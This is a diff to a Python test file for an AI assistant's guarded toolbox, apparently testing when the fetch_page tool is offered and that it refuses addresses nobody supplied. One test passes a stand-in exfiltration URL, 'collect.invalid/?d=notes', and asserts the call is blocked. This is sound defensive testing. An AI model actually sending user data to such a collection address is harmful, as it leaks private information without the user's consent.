@@ -1,5 +1,7 @@
 """The checks every tool call passes and the cleaning every result gets (design doc v2/12 sections 3.2 to 3.5 and 3.7)."""
 
+import asyncio
+
 import pytest
 
 from assistant_core.egress_guard import leaked_terms, private_terms_in
@@ -54,15 +56,30 @@ async def test_an_expression_that_arrived_as_a_number_is_refused_with_the_quoted
     assert server.calls == []
 
 
+async def test_fetch_page_is_offered_only_when_the_user_gives_an_address() -> None:
+    without_address, _ = await guarded()
+    with_address, _ = await guarded(question="What does bakery.example say about banana bread?")
+    assert "fetch_page" not in [spec.name for spec in await without_address.list_tools()]
+    assert "fetch_page" in [spec.name for spec in await with_address.list_tools()]
+
+
+async def test_web_search_is_never_offered_because_search_and_read_covers_it() -> None:
+    web_search = SEARCH_TOOL.model_copy(update={"name": "web_search"})
+    server = ToolServer(RESULTS_WITH_ADDRESS)
+    server.list_tools = lambda: asyncio.sleep(0, result=[SEARCH_TOOL, web_search])
+    tools = GuardedToolBox(server, load_tool_table(), [Message(role=Role.USER, content="Read https://bakery.example/banana-bread")])
+    assert [spec.name for spec in await tools.list_tools()] == ["search_and_read"]
+
+
 async def test_fetch_page_reads_an_address_from_this_exchanges_results() -> None:
-    tools, server = await guarded()
+    tools, server = await guarded(question="What does bakery.example say about banana bread?")
     await tools.call(ToolCall(id="s", name="search_and_read", arguments={"query": "banana bread bake time"}))
     await tools.call(ToolCall(id="f", name="fetch_page", arguments={"url": "https://bakery.example/banana-bread"}))
     assert [call.name for call in server.calls] == ["search_and_read", "fetch_page"]
 
 
 async def test_fetch_page_refuses_an_address_nobody_gave_it() -> None:
-    tools, server = await guarded()
+    tools, server = await guarded(question="What does bakery.example say about banana bread?")
     await tools.call(ToolCall(id="s", name="search_and_read", arguments={"query": "banana bread"}))
     with pytest.raises(ToolRefused, match=PROVENANCE_REFUSAL):
         await tools.call(ToolCall(id="f", name="fetch_page", arguments={"url": "https://collect.invalid/?d=notes"}))
